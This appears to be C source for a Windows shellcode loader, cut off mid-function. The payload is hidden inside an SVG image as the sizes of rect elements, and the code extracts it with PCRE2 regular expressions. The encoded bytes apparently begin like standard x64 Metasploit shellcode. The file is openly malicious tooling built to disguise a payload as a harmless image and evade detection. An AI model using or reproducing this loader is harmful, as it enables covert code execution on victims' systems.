#define PCRE2_CODE_UNIT_WIDTH 8
#define PCRE2_STATIC
#include <pcre2.h>
#include <string.h>
#include <windows.h>

const char* payload[] = {
    "<?xml version=\"1.0\" standalone=\"no\"?>",
    "<svg xmlns=\"http://www.w3.org/2000/svg\" version=\"1.1\" width=\"1250cm\" height=\"1250cm\">",
    "<desc>9W43OV00W8JKMA1IJNEYAM1WTG9AZH8K10LC</desc>",
    "<g id=\"HMLW03D1BYIQ\" fill=\"red\">",
    "<rect x=\"252cm\" y=\"252cm\" width=\"252cm\" height=\"252cm\"/>",
    "<rect x=\"72cm\" y=\"72cm\" width=\"72cm\" height=\"72cm\"/>",
    "<rect x=\"131cm\" y=\"131cm\" width=\"131cm\" height=\"131cm\"/>",
    "<rect x=\"228cm\" y=\"228cm\" width=\"228cm\" height=\"228cm\"/>",
    "<rect x=\"240cm\" y=\"240cm\" width=\"240cm\" height=\"240cm\"/>",
    "<rect x=\"232cm\" y=\"232cm\" width=\"232cm\" height=\"232cm\"/>",
    "<rect x=\"192cm\" y=\"192cm\" width=\"192cm\" height=\"192cm\"/>",
    "<rect x=\"0cm\" y=\"0cm\" width=\"0cm\" height=\"0cm\"/>",
    "<rect x=\"0cm\" y=\"0cm\" width=\"0cm\" height=\"0cm\"/>",
    "<rect x=\"0cm\" y=\"0cm\" width=\"0cm\" height=\"0cm\"/>",
    "<rect x=\"65cm\" y=\"65cm\" width=\"65cm\" height=\"65cm\"/>",
    "<rect x=\"81cm\" y=\"81cm\" width=\"81cm\" height=\"81cm\"/>",
    "<rect x=\"65cm\" y=\"65cm\" width=\"65cm\" height=\"65cm\"/>",
    "<rect x=\"80cm\" y=\"80cm\" width=\"80cm\" height=\"80cm\"/>",
    "<rect x=\"82cm\" y=\"82cm\" width=\"82cm\" height=\"82cm\"/>",
    "<rect x=\"81cm\" y=\"81cm\" width=\"81cm\" height=\"81cm\"/>",
    "</g>",
    "<g id=\"PTOM494F7XQT\" fill=\"blue\">",
    "<rect x=\"86cm\" y=\"86cm\" width=\"86cm\" height=\"86cm\"/>",
    "<rect x=\"72cm\" y=\"72cm\" width=\"72cm\" height=\"72cm\"/>",
    "<rect x=\"49cm\" y=\"49cm\" width=\"49cm\" height=\"49cm\"/>",
    "<rect x=\"210cm\" y=\"210cm\" width=\"210cm\" height=\"210cm\"/>",
    "<rect x=\"101cm\" y=\"101cm\" width=\"101cm\" height=\"101cm\"/>",
    "<rect x=\"72cm\" y=\"72cm\" width=\"72cm\" height=\"72cm\"/>",
    "<rect x=\"139cm\" y=\"139cm\" width=\"139cm\" height=\"139cm\"/>",
    "<rect x=\"82cm\" y=\"82cm\" width=\"82cm\" height=\"82cm\"/>",
    "<rect x=\"96cm\" y=\"96cm\" width=\"96cm\" height=\"96cm\"/>",
    "<rect x=\"72cm\" y=\"72cm\" width=\"72cm\" height=\"72cm\"/>",
    "<rect x=\"139cm\" y=\"139cm\" width=\"139cm\" height=\"139cm\"/>",
    "<rect x=\"82cm\" y=\"82cm\" width=\"82cm\" height=\"82cm\"/>",
    "<rect x=\"24cm\" y=\"24cm\" width=\"24cm\" height=\"24cm\"/>",
    "<rect x=\"72cm\" y=\"72cm\" width=\"72cm\" height=\"72cm\"/>",
    "<rect x=\"139cm\" y=\"139cm\" width=\"139cm\" height=\"139cm\"/>",
    "<rect x=\"82cm\" y=\"82cm\" width=\"82cm\" height=\"82cm\"/>",
    "</g>",
    "<g id=\"B6WOK4DIL4EX\" fill=\"purple\">",
    "<rect x=\"32cm\" y=\"32cm\" width=\"32cm\" height=\"32cm\"/>",
    "<rect x=\"72cm\" y=\"72cm\" width=\"72cm\" height=\"72cm\"/>",
    "<rect x=\"139cm\" y=\"139cm\" width=\"139cm\" height=\"139cm\"/>",
    "<rect x=\"114cm\" y=\"114cm\" width=\"114cm\" height=\"114cm\"/>",
    "<rect x=\"80cm\" y=\"80cm\" width=\"80cm\" height=\"80cm\"/>",
    "<rect x=\"72cm\" y=\"72cm\" width=\"72cm\" height=\"72cm\"/>",
    "<rect x=\"15cm\" y=\"15cm\" width=\"15cm\" height=\"15cm\"/>",
    "<rect x=\"183cm\" y=\"183cm\" width=\"183cm\" height=\"183cm\"/>",
    "<rect x=\"74cm\" y=\"74cm\" width=\"74cm\" height=\"74cm\"/>",
    "<rect x=\"74cm\" y=\"74cm\" width=\"74cm\" height=\"74cm\"/>",
    "<rect x=\"77cm\" y=\"77cm\" width=\"77cm\" height=\"77cm\"/>",
    "<rect x=\"49cm\" y=\"49cm\" width=\"49cm\" height=\"49cm\"/>",
    "<rect x=\"201cm\" y=\"201cm\" width=\"201cm\" height=\"201cm\"/>",
    "<rect x=\"72cm\" y=\"72cm\" width=\"72cm\" height=\"72cm\"/>",
    "<rect x=\"49cm\" y=\"49cm\" width=\"49cm\" height=\"49cm\"/>",
    "<rect x=\"192cm\" y=\"192cm\" width=\"192cm\" height=\"192cm\"/>",
    "</g>",
    "<g id=\"YQ5K42J2YZ23\" fill=\"orange\">",
    "<rect x=\"172cm\" y=\"172cm\" width=\"172cm\" height=\"172cm\"/>",
    "<rect x=\"60cm\" y=\"60cm\" width=\"60cm\" height=\"60cm\"/>",
    "<rect x=\"97cm\" y=\"97cm\" width=\"97cm\" height=\"97cm\"/>",
    "<rect x=\"124cm\" y=\"124cm\" width=\"124cm\" height=\"124cm\"/>",
    "<rect x=\"2cm\" y=\"2cm\" width=\"2cm\" height=\"2cm\"/>",
    "<rect x=\"44cm\" y=\"44cm\" width=\"44cm\" height=\"44cm\"/>",
    "<rect x=\"32cm\" y=\"32cm\" width=\"32cm\" height=\"32cm\"/>",
    "<rect x=\"65cm\" y=\"65cm\" width=\"65cm\" height=\"65cm\"/>",
    "<rect x=\"193cm\" y=\"193cm\" width=\"193cm\" height=\"193cm\"/>",
    "<rect x=\"201cm\" y=\"201cm\" width=\"201cm\" height=\"201cm\"/>",
    "<rect x=\"13cm\" y=\"13cm\" width=\"13cm\" height=\"13cm\"/>",
    "<rect x=\"65cm\" y=\"65cm\" width=\"65cm\" height=\"65cm\"/>",
    "<rect x=\"1cm\" y=\"1cm\" width=\"1cm\" height=\"1cm\"/>",
    "<rect x=\"193cm\" y=\"193cm\" width=\"193cm\" height=\"193cm\"/>",
    "<rect x=\"226cm\" y=\"226cm\" width=\"226cm\" height=\"226cm\"/>",
    "<rect x=\"237cm\" y=\"237cm\" width=\"237cm\" height=\"237cm\"/>",
    "</g>",
    "<g id=\"2OPL8UJJWAVL\" fill=\"blue\">",
    "<rect x=\"82cm\" y=\"82cm\" width=\"82cm\" height=\"82cm\"/>",
    "<rect x=\"65cm\" y=\"65cm\" width=\"65cm\" height=\"65cm\"/>",
    "<rect x=\"81cm\" y=\"81cm\" width=\"81cm\" height=\"81cm\"/>",
    "<rect x=\"72cm\" y=\"72cm\" width=\"72cm\" height=\"72cm\"/>",
    "<rect x=\"139cm\" y=\"139cm\" width=\"139cm\" height=\"139cm\"/>",
    "<rect x=\"82cm\" y=\"82cm\" width=\"82cm\" height=\"82cm\"/>",
    "<rect x=\"32cm\" y=\"32cm\" width=\"32cm\" height=\"32cm\"/>",
    "<rect x=\"139cm\" y=\"139cm\" width=\"139cm\" height=\"139cm\"/>",
    "<rect x=\"66cm\" y=\"66cm\" width=\"66cm\" height=\"66cm\"/>",
    "<rect x=\"60cm\" y=\"60cm\" width=\"60cm\" height=\"60cm\"/>",
    "<rect x=\"72cm\" y=\"72cm\" width=\"72cm\" height=\"72cm\"/>",
    "<rect x=\"1cm\" y=\"1cm\" width=\"1cm\" height=\"1cm\"/>",
    "<rect x=\"208cm\" y=\"208cm\" width=\"208cm\" height=\"208cm\"/>",
    "<rect x=\"139cm\" y=\"139cm\" width=\"139cm\" height=\"139cm\"/>",
    "<rect x=\"128cm\" y=\"128cm\" width=\"128cm\" height=\"128cm\"/>",
    "<rect x=\"136cm\" y=\"136cm\" width=\"136cm\" height=\"136cm\"/>",
    "</g>",
    "<g id=\"0HXE4D6ANDY4\" fill=\"purple\">",
    "<rect x=\"0cm\" y=\"0cm\" width=\"0cm\" height=\"0cm\"/>",
    "<rect x=\"0cm\" y=\"0cm\" width=\"0cm\" height=\"0cm\"/>",
    "<rect x=\"0cm\" y=\"0cm\" width=\"0cm\" height=\"0cm\"/>",
    "<rect x=\"72cm\" y=\"72cm\" width=\"72cm\" height=\"72cm\"/>",
    "<rect x=\"133cm\" y=\"133cm\" width=\"133cm\" height=\"133cm\"/>",
    "<rect x=\"192cm\" y=\"192cm\" width=\"192cm\" height=\"192cm\"/>",
    "<rect x=\"116cm\" y=\"116cm\" width=\"116cm\" height=\"116cm\"/>",
    "<rect x=\"103cm\" y=\"103cm\" width=\"103cm\" height=\"103cm\"/>",
    "<rect x=\"72cm\" y=\"72cm\" width=\"72cm\" height=\"72cm\"/>",
    "<rect x=\"1cm\" y=\"1cm\" width=\"1cm\" height=\"1cm\"/>",
    "<rect x=\"208cm\" y=\"208cm\" width=\"208cm\" height=\"208cm\"/>",
    "<rect x=\"80cm\" y=\"80cm\" width=\"80cm\" height=\"80cm\"/>",
    "<rect x=\"139cm\" y=\"139cm\" width=\"139cm\" height=\"139cm\"/>",
    "<rect x=\"72cm\" y=\"72cm\" width=\"72cm\" height=\"72cm\"/>",
    "<rect x=\"24cm\" y=\"24cm\" width=\"24cm\" height=\"24cm\"/>",
    "<rect x=\"68cm\" y=\"68cm\" width=\"68cm\" height=\"68cm\"/>",
    "</g>",
    "<g id=\"YV328TZSQVJL\" fill=\"blue\">",
    "<rect x=\"139cm\" y=\"139cm\" width=\"139cm\" height=\"139cm\"/>",
    "<rect x=\"64cm\" y=\"64cm\" width=\"64cm\" height=\"64cm\"/>",
    "<rect x=\"32cm\" y=\"32cm\" width=\"32cm\" height=\"32cm\"/>",
    "<rect x=\"73cm\" y=\"73cm\" width=\"73cm\" height=\"73cm\"/>",
    "<rect x=\"1cm\" y=\"1cm\" width=\"1cm\" height=\"1cm\"/>",
    "<rect x=\"208cm\" y=\"208cm\" width=\"208cm\" height=\"208cm\"/>",
    "<rect x=\"227cm\" y=\"227cm\" width=\"227cm\" height=\"227cm\"/>",
    "<rect x=\"86cm\" y=\"86cm\" width=\"86cm\" height=\"86cm\"/>",
    "<rect x=\"72cm\" y=\"72cm\" width=\"72cm\" height=\"72cm\"/>",
    "<rect x=\"255cm\" y=\"255cm\" width=\"255cm\" height=\"255cm\"/>",
    "<rect x=\"201cm\" y=\"201cm\" width=\"201cm\" height=\"201cm\"/>",
    "<rect x=\"65cm\" y=\"65cm\" width=\"65cm\" height=\"65cm\"/>",
    "<rect x=\"139cm\" y=\"139cm\" width=\"139cm\" height=\"139cm\"/>",
    "<rect x=\"52cm\" y=\"52cm\" width=\"52cm\" height=\"52cm\"/>",
    "<rect x=\"136cm\" y=\"136cm\" width=\"136cm\" height=\"136cm\"/>",
    "<rect x=\"72cm\" y=\"72cm\" width=\"72cm\" height=\"72cm\"/>",
    "</g>",
    "<g id=\"ER792VIS9SPE\" fill=\"green\">",
    "<rect x=\"1cm\" y=\"1cm\" width=\"1cm\" height=\"1cm\"/>",
    "<rect x=\"214cm\" y=\"214cm\" width=\"214cm\" height=\"214cm\"/>",
    "<rect x=\"77cm\" y=\"77cm\" width=\"77cm\" height=\"77cm\"/>",
    "<rect x=\"49cm\" y=\"49cm\" width=\"49cm\" height=\"49cm\"/>",
    "<rect x=\"201cm\" y=\"201cm\" width=\"201cm\" height=\"201cm\"/>",
    "<rect x=\"72cm\" y=\"72cm\" width=\"72cm\" height=\"72cm\"/>",
    "<rect x=\"49cm\" y=\"49cm\" width=\"49cm\" height=\"49cm\"/>",
    "<rect x=\"192cm\" y=\"192cm\" width=\"192cm\" height=\"192cm\"/>",
    "<rect x=\"172cm\" y=\"172cm\" width=\"172cm\" height=\"172cm\"/>",
    "<rect x=\"65cm\" y=\"65cm\" width=\"65cm\" height=\"65cm\"/>",
    "<rect x=\"193cm\" y=\"193cm\" width=\"193cm\" height=\"193cm\"/>",
    "<rect x=\"201cm\" y=\"201cm\" width=\"201cm\" height=\"201cm\"/>",
    "<rect x=\"13cm\" y=\"13cm\" width=\"13cm\" height=\"13cm\"/>",
    "<rect x=\"65cm\" y=\"65cm\" width=\"65cm\" height=\"65cm\"/>",
    "<rect x=\"1cm\" y=\"1cm\" width=\"1cm\" height=\"1cm\"/>",
    "<rect x=\"193cm\" y=\"193cm\" width=\"193cm\" height=\"193cm\"/>",
    "</g>",
    "<g id=\"38CVXJ72Y8LC\" fill=\"blue\">",
    "<rect x=\"56cm\" y=\"56cm\" width=\"56cm\" height=\"56cm\"/>",
    "<rect x=\"224cm\" y=\"224cm\" width=\"224cm\" height=\"224cm\"/>",
    "<rect x=\"117cm\" y=\"117cm\" width=\"117cm\" height=\"117cm\"/>",
    "<rect x=\"241cm\" y=\"241cm\" width=\"241cm\" height=\"241cm\"/>",
    "<rect x=\"76cm\" y=\"76cm\" width=\"76cm\" height=\"76cm\"/>",
    "<rect x=\"3cm\" y=\"3cm\" width=\"3cm\" height=\"3cm\"/>",
    "<rect x=\"76cm\" y=\"76cm\" width=\"76cm\" height=\"76cm\"/>",
    "<rect x=\"36cm\" y=\"36cm\" width=\"36cm\" height=\"36cm\"/>",
    "<rect x=\"8cm\" y=\"8cm\" width=\"8cm\" height=\"8cm\"/>",
    "<rect x=\"69cm\" y=\"69cm\" width=\"69cm\" height=\"69cm\"/>",
    "<rect x=\"57cm\" y=\"57cm\" width=\"57cm\" height=\"57cm\"/>",
    "<rect x=\"209cm\" y=\"209cm\" width=\"209cm\" height=\"209cm\"/>",
    "<rect x=\"117cm\" y=\"117cm\" width=\"117cm\" height=\"117cm\"/>",
    "<rect x=\"216cm\" y=\"216cm\" width=\"216cm\" height=\"216cm\"/>",
    "<rect x=\"88cm\" y=\"88cm\" width=\"88cm\" height=\"88cm\"/>",
    "<rect x=\"68cm\" y=\"68cm\" width=\"68cm\" height=\"68cm\"/>",
    "</g>",
    "<g id=\"HHNF6FZJDJFL\" fill=\"purple\">",
    "<rect x=\"139cm\" y=\"139cm\" width=\"139cm\" height=\"139cm\"/>",
    "<rect x=\"64cm\" y=\"64cm\" width=\"64cm\" height=\"64cm\"/>",
    "<rect x=\"36cm\" y=\"36cm\" width=\"36cm\" height=\"36cm\"/>",
    "<rect x=\"73cm\" y=\"73cm\" width=\"73cm\" height=\"73cm\"/>",
    "<rect x=\"1cm\" y=\"1cm\" width=\"1cm\" height=\"1cm\"/>",
    "<rect x=\"208cm\" y=\"208cm\" width=\"208cm\" height=\"208cm\"/>",
    "<rect x=\"102cm\" y=\"102cm\" width=\"102cm\" height=\"102cm\"/>",
    "<rect x=\"65cm\" y=\"65cm\" width=\"65cm\" height=\"65cm\"/>",
    "<rect x=\"139cm\" y=\"139cm\" width=\"139cm\" height=\"139cm\"/>",
    "<rect x=\"12cm\" y=\"12cm\" width=\"12cm\" height=\"12cm\"/>",
    "<rect x=\"72cm\" y=\"72cm\" width=\"72cm\" height=\"72cm\"/>",
    "<rect x=\"68cm\" y=\"68cm\" width=\"68cm\" height=\"68cm\"/>",
    "<rect x=\"139cm\" y=\"139cm\" width=\"139cm\" height=\"139cm\"/>",
    "<rect x=\"64cm\" y=\"64cm\" width=\"64cm\" height=\"64cm\"/>",
    "<rect x=\"28cm\" y=\"28cm\" width=\"28cm\" height=\"28cm\"/>",
    "<rect x=\"73cm\" y=\"73cm\" width=\"73cm\" height=\"73cm\"/>",
    "</g>",
    "<g id=\"4EAFYJQLCFM6\" fill=\"green\">",
    "<rect x=\"1cm\" y=\"1cm\" width=\"1cm\" height=\"1cm\"/>",
    "<rect x=\"208cm\" y=\"208cm\" width=\"208cm\" height=\"208cm\"/>",
    "<rect x=\"65cm\" y=\"65cm\" width=\"65cm\" height=\"65cm\"/>",
    "<rect x=\"139cm\" y=\"139cm\" width=\"139cm\" height=\"139cm\"/>",
    "<rect x=\"4cm\" y=\"4cm\" width=\"4cm\" height=\"4cm\"/>",
    "<rect x=\"136cm\" y=\"136cm\" width=\"136cm\" height=\"136cm\"/>",
    "<rect x=\"72cm\" y=\"72cm\" width=\"72cm\" height=\"72cm\"/>",
    "<rect x=\"1cm\" y=\"1cm\" width=\"1cm\" height=\"1cm\"/>",
    "<rect x=\"208cm\" y=\"208cm\" width=\"208cm\" height=\"208cm\"/>",
    "<rect x=\"65cm\" y=\"65cm\" width=\"65cm\" height=\"65cm\"/>",
    "<rect x=\"88cm\" y=\"88cm\" width=\"88cm\" height=\"88cm\"/>",
    "<rect x=\"65cm\" y=\"65cm\" width=\"65cm\" height=\"65cm\"/>",
    "<rect x=\"88cm\" y=\"88cm\" width=\"88cm\" height=\"88cm\"/>",
    "<rect x=\"94cm\" y=\"94cm\" width=\"94cm\" height=\"94cm\"/>",
    "<rect x=\"89cm\" y=\"89cm\" width=\"89cm\" height=\"89cm\"/>",
    "<rect x=\"90cm\" y=\"90cm\" width=\"90cm\" height=\"90cm\"/>",
    "</g>",
    "<g id=\"0FRVHQHE2DP7\" fill=\"blue\">",
    "<rect x=\"65cm\" y=\"65cm\" width=\"65cm\" height=\"65cm\"/>",
    "<rect x=\"88cm\" y=\"88cm\" width=\"88cm\" height=\"88cm\"/>",
    "<rect x=\"65cm\" y=\"65cm\" width=\"65cm\" height=\"65cm\"/>",
    "<rect x=\"89cm\" y=\"89cm\" width=\"89cm\" height=\"89cm\"/>",
    "<rect x=\"65cm\" y=\"65cm\" width=\"65cm\" height=\"65cm\"/>",
    "<rect x=\"90cm\" y=\"90cm\" width=\"90cm\" height=\"90cm\"/>",
    "<rect x=\"72cm\" y=\"72cm\" width=\"72cm\" height=\"72cm\"/>",
    "<rect x=\"131cm\" y=\"131cm\" width=\"131cm\" height=\"131cm\"/>",
    "<rect x=\"236cm\" y=\"236cm\" width=\"236cm\" height=\"236cm\"/>",
    "<rect x=\"32cm\" y=\"32cm\" width=\"32cm\" height=\"32cm\"/>",
    "<rect x=\"65cm\" y=\"65cm\" width=\"65cm\" height=\"65cm\"/>",
    "<rect x=\"82cm\" y=\"82cm\" width=\"82cm\" height=\"82cm\"/>",
    "<rect x=\"255cm\" y=\"255cm\" width=\"255cm\" height=\"255cm\"/>",
    "<rect x=\"224cm\" y=\"224cm\" width=\"224cm\" height=\"224cm\"/>",
    "<rect x=\"88cm\" y=\"88cm\" width=\"88cm\" height=\"88cm\"/>",
    "<rect x=\"65cm\" y=\"65cm\" width=\"65cm\" height=\"65cm\"/>",
    "</g>",
    "<g id=\"DQU5PRAV1Y45\" fill=\"green\">",
    "<rect x=\"89cm\" y=\"89cm\" width=\"89cm\" height=\"89cm\"/>",
    "<rect x=\"90cm\" y=\"90cm\" width=\"90cm\" height=\"90cm\"/>",
    "<rect x=\"72cm\" y=\"72cm\" width=\"72cm\" height=\"72cm\"/>",
    "<rect x=\"139cm\" y=\"139cm\" width=\"139cm\" height=\"139cm\"/>",
    "<rect x=\"18cm\" y=\"18cm\" width=\"18cm\" height=\"18cm\"/>",
    "<rect x=\"233cm\" y=\"233cm\" width=\"233cm\" height=\"233cm\"/>",
    "<rect x=\"87cm\" y=\"87cm\" width=\"87cm\" height=\"87cm\"/>",
    "<rect x=\"255cm\" y=\"255cm\" width=\"255cm\" height=\"255cm\"/>",
    "<rect x=\"255cm\" y=\"255cm\" width=\"255cm\" height=\"255cm\"/>",
    "<rect x=\"255cm\" y=\"255cm\" width=\"255cm\" height=\"255cm\"/>",
    "<rect x=\"93cm\" y=\"93cm\" width=\"93cm\" height=\"93cm\"/>",
    "<rect x=\"72cm\" y=\"72cm\" width=\"72cm\" height=\"72cm\"/>",
    "<rect x=\"186cm\" y=\"186cm\" width=\"186cm\" height=\"186cm\"/>",
    "<rect x=\"1cm\" y=\"1cm\" width=\"1cm\" height=\"1cm\"/>",
    "<rect x=\"0cm\" y=\"0cm\" width=\"0cm\" height=\"0cm\"/>",
    "<rect x=\"0cm\" y=\"0cm\" width=\"0cm\" height=\"0cm\"/>",
    "</g>",
    "<g id=\"G1NAJEFKTTF9\" fill=\"red\">",
    "<rect x=\"0cm\" y=\"0cm\" width=\"0cm\" height=\"0cm\"/>",
    "<rect x=\"0cm\" y=\"0cm\" width=\"0cm\" height=\"0cm\"/>",
    "<rect x=\"0cm\" y=\"0cm\" width=\"0cm\" height=\"0cm\"/>",
    "<rect x=\"0cm\" y=\"0cm\" width=\"0cm\" height=\"0cm\"/>",
    "<rect x=\"0cm\" y=\"0cm\" width=\"0cm\" height=\"0cm\"/>",
    "<rect x=\"72cm\" y=\"72cm\" width=\"72cm\" height=\"72cm\"/>",
    "<rect x=\"141cm\" y=\"141cm\" width=\"141cm\" height=\"141cm\"/>",
    "<rect x=\"141cm\" y=\"141cm\" width=\"141cm\" height=\"141cm\"/>",
    "<rect x=\"1cm\" y=\"1cm\" width=\"1cm\" height=\"1cm\"/>",
    "<rect x=\"1cm\" y=\"1cm\" width=\"1cm\" height=\"1cm\"/>",
    "<rect x=\"0cm\" y=\"0cm\" width=\"0cm\" height=\"0cm\"/>",
    "<rect x=\"0cm\" y=\"0cm\" width=\"0cm\" height=\"0cm\"/>",
    "<rect x=\"65cm\" y=\"65cm\" width=\"65cm\" height=\"65cm\"/>",
    "<rect x=\"186cm\" y=\"186cm\" width=\"186cm\" height=\"186cm\"/>",
    "<rect x=\"49cm\" y=\"49cm\" width=\"49cm\" height=\"49cm\"/>",
    "<rect x=\"139cm\" y=\"139cm\" width=\"139cm\" height=\"139cm\"/>",
    "</g>",
    "<g id=\"EDW9O9TY1ZNK\" fill=\"orange\">",
    "<rect x=\"111cm\" y=\"111cm\" width=\"111cm\" height=\"111cm\"/>",
    "<rect x=\"135cm\" y=\"135cm\" width=\"135cm\" height=\"135cm\"/>",
    "<rect x=\"255cm\" y=\"255cm\" width=\"255cm\" height=\"255cm\"/>",
    "<rect x=\"213cm\" y=\"213cm\" width=\"213cm\" height=\"213cm\"/>",
    "<rect x=\"187cm\" y=\"187cm\" width=\"187cm\" height=\"187cm\"/>",
    "<rect x=\"224cm\" y=\"224cm\" width=\"224cm\" height=\"224cm\"/>",
    "<rect x=\"29cm\" y=\"29cm\" width=\"29cm\" height=\"29cm\"/>",
    "<rect x=\"42cm\" y=\"42cm\" width=\"42cm\" height=\"42cm\"/>",
    "<rect x=\"10cm\" y=\"10cm\" width=\"10cm\" height=\"10cm\"/>",
    "<rect x=\"65cm\" y=\"65cm\" width=\"65cm\" height=\"65cm\"/>",
    "<rect x=\"186cm\" y=\"186cm\" width=\"186cm\" height=\"186cm\"/>",
    "<rect x=\"166cm\" y=\"166cm\" width=\"166cm\" height=\"166cm\"/>",
    "<rect x=\"149cm\" y=\"149cm\" width=\"149cm\" height=\"149cm\"/>",
    "<rect x=\"189cm\" y=\"189cm\" width=\"189cm\" height=\"189cm\"/>",
    "<rect x=\"157cm\" y=\"157cm\" width=\"157cm\" height=\"157cm\"/>",
    "<rect x=\"255cm\" y=\"255cm\" width=\"255cm\" height=\"255cm\"/>",
    "</g>",
    "<g id=\"WSIBORZLEQRX\" fill=\"blue\">",
    "<rect x=\"213cm\" y=\"213cm\" width=\"213cm\" height=\"213cm\"/>",
    "<rect x=\"72cm\" y=\"72cm\" width=\"72cm\" height=\"72cm\"/>",
    "<rect x=\"131cm\" y=\"131cm\" width=\"131cm\" height=\"131cm\"/>",
    "<rect x=\"196cm\" y=\"196cm\" width=\"196cm\" height=\"196cm\"/>",
    "<rect x=\"40cm\" y=\"40cm\" width=\"40cm\" height=\"40cm\"/>",
    "<rect x=\"60cm\" y=\"60cm\" width=\"60cm\" height=\"60cm\"/>",
    "<rect x=\"6cm\" y=\"6cm\" width=\"6cm\" height=\"6cm\"/>",
    "<rect x=\"124cm\" y=\"124cm\" width=\"124cm\" height=\"124cm\"/>",
    "<rect x=\"10cm\" y=\"10cm\" width=\"10cm\" height=\"10cm\"/>",
    "<rect x=\"128cm\" y=\"128cm\" width=\"128cm\" height=\"128cm\"/>",
    "<rect x=\"251cm\" y=\"251cm\" width=\"251cm\" height=\"251cm\"/>",
    "<rect x=\"224cm\" y=\"224cm\" width=\"224cm\" height=\"224cm\"/>",
    "<rect x=\"117cm\" y=\"117cm\" width=\"117cm\" height=\"117cm\"/>",
    "<rect x=\"5cm\" y=\"5cm\" width=\"5cm\" height=\"5cm\"/>",
    "<rect x=\"187cm\" y=\"187cm\" width=\"187cm\" height=\"187cm\"/>",
    "<rect x=\"71cm\" y=\"71cm\" width=\"71cm\" height=\"71cm\"/>",
    "</g>",
    "<g id=\"P44EGJA20869\" fill=\"red\">",
    "<rect x=\"19cm\" y=\"19cm\" width=\"19cm\" height=\"19cm\"/>",
    "<rect x=\"114cm\" y=\"114cm\" width=\"114cm\" height=\"114cm\"/>",
    "<rect x=\"111cm\" y=\"111cm\" width=\"111cm\" height=\"111cm\"/>",
    "<rect x=\"106cm\" y=\"106cm\" width=\"106cm\" height=\"106cm\"/>",
    "<rect x=\"0cm\" y=\"0cm\" width=\"0cm\" height=\"0cm\"/>",
    "<rect x=\"89cm\" y=\"89cm\" width=\"89cm\" height=\"89cm\"/>",
    "<rect x=\"65cm\" y=\"65cm\" width=\"65cm\" height=\"65cm\"/>",
    "<rect x=\"137cm\" y=\"137cm\" width=\"137cm\" height=\"137cm\"/>",
    "<rect x=\"218cm\" y=\"218cm\" width=\"218cm\" height=\"218cm\"/>",
    "<rect x=\"255cm\" y=\"255cm\" width=\"255cm\" height=\"255cm\"/>",
    "<rect x=\"213cm\" y=\"213cm\" width=\"213cm\" height=\"213cm\"/>",
    "<rect x=\"99cm\" y=\"99cm\" width=\"99cm\" height=\"99cm\"/>",
    "<rect x=\"97cm\" y=\"97cm\" width=\"97cm\" height=\"97cm\"/>",
    "<rect x=\"108cm\" y=\"108cm\" width=\"108cm\" height=\"108cm\"/>",
    "<rect x=\"99cm\" y=\"99cm\" width=\"99cm\" height=\"99cm\"/>",
    "<rect x=\"0cm\" y=\"0cm\" width=\"0cm\" height=\"0cm\"/>",
    "</g>",
    "</svg>"
};

struct svgdata
{
    unsigned char* shellcode;
    int size;
};

char *strremove(char *str, const char *sub)
{
    // https://stackoverflow.com/a/47117431
    char *p, *q, *r;
    if (*sub && (q = r = strstr(str, sub)) != NULL) {
        size_t len = strlen(sub);
        while ((r = strstr(p = r + len, sub)) != NULL) {
            while (p < r)
                *q++ = *p++;
        }
        while ((*q++ = *p++) != '\0')
            continue;
    }
    return str;
}

struct svgdata * GetShellcodeFromSVG()
{
  int sz = sizeof(payload) / sizeof(payload[0]);
  int holder[sz];
  int count = 0;
  memset(holder, 0, sz);

  char* temp = (char*)malloc(5);
  memset(temp, '\0', 5);    
  for (int line = 0; line < sz; ++line)
  {  
    pcre2_code *re;
    PCRE2_SPTR pattern;
    PCRE2_SPTR subject;
    PCRE2_SPTR name_table;

    int crlf_is_newline;
    int errornumber;
    int find_all;
    int i;
    int namecount;
    int name_entry_size;
    int rc;
    int utf8;

    uint32_t option_bits;
    uint32_t newline;

    PCRE2_SIZE erroroffset;
    PCRE2_SIZE *ovector;

    size_t subject_length;
    pcre2_match_data *match_data;

    find_all = 1;

    pattern = (PCRE2_SPTR)"\"\\d{1,3}cm\"";
    subject = (PCRE2_SPTR)payload[line];
    subject_length = strlen((char *)subject);

    re = pcre2_compile(pattern, PCRE2_ZERO_TERMINATED, 0, &errornumber, &erroroffset, NULL);

    if (re == NULL)
    {
      PCRE2_UCHAR buffer[256];
      pcre2_get_error_message(errornumber, buffer, sizeof(buffer));
      continue;
    }

    match_data = pcre2_match_data_create_from_pattern(re, NULL);

    rc = pcre2_match(re, subject, subject_length, 0, 0, match_data, NULL);

    if (rc < 0)
    {
      pcre2_match_data_free(match_data);
      pcre2_code_free(re);
      continue;
    }

    ovector = pcre2_get_ovector_pointer(match_data);

    if (rc == 0)
    {
      continue;
    }

    for (i = 0; i < rc; i++)
    {
      PCRE2_SPTR substring_start = subject + ovector[2*i];
      size_t substring_length = ovector[2*i+1] - ovector[2*i];
      sprintf(temp, "%.*s", (int)substring_length, (char *)substring_start);
    }

    (void)pcre2_pattern_info(re, PCRE2_INFO_NAMECOUNT, &namecount);

    if (namecount > 0)
    {
      PCRE2_SPTR tabptr;
      (void)pcre2_pattern_info(re, PCRE2_INFO_NAMETABLE, &name_table);
      (void)pcre2_pattern_info(re, PCRE2_INFO_NAMEENTRYSIZE, &name_entry_size);

      tabptr = name_table;
      for (i = 0; i < namecount; i++)
      {
        int n = (tabptr[0] << 8) | tabptr[1];
        tabptr += name_entry_size;
      }
    }

    (void)pcre2_pattern_info(re, PCRE2_INFO_ALLOPTIONS, &option_bits);
    utf8 = (option_bits & PCRE2_UTF) != 0;
    (void)pcre2_pattern_info(re, PCRE2_INFO_NEWLINE, &newline);
    crlf_is_newline = newline == PCRE2_NEWLINE_ANY || newline == PCRE2_NEWLINE_CRLF || newline == PCRE2_NEWLINE_ANYCRLF;

    for (;;)
    {
      uint32_t options = 0;
      PCRE2_SIZE start_offset = ovector[1];

      if (ovector[0] == ovector[1])
      {
        if (ovector[0] == subject_length)
          {
            break;
          }
        options = PCRE2_NOTEMPTY_ATSTART | PCRE2_ANCHORED;
      }

      rc = pcre2_match(re, subject, subject_length, start_offset, options, match_data, NULL);

      if (rc == PCRE2_ERROR_NOMATCH)
      {
        if (options == 0) break;
        ovector[1] = start_offset + 1;
        if (crlf_is_newline && start_offset < subject_length - 1 && subject[start_offset] == '\r' && subject[start_offset + 1] == '\n')
        ovector[1] += 1;
        else if (utf8)
          {
            while (ovector[1] < subject_length)
            {
              if ((subject[ovector[1]] & 0xc0) != 0x80) break;
              ovector[1] += 1;
            }
        }
        continue;
      }

      if (rc < 0)
      {
        pcre2_match_data_free(match_data);
        pcre2_code_free(re);
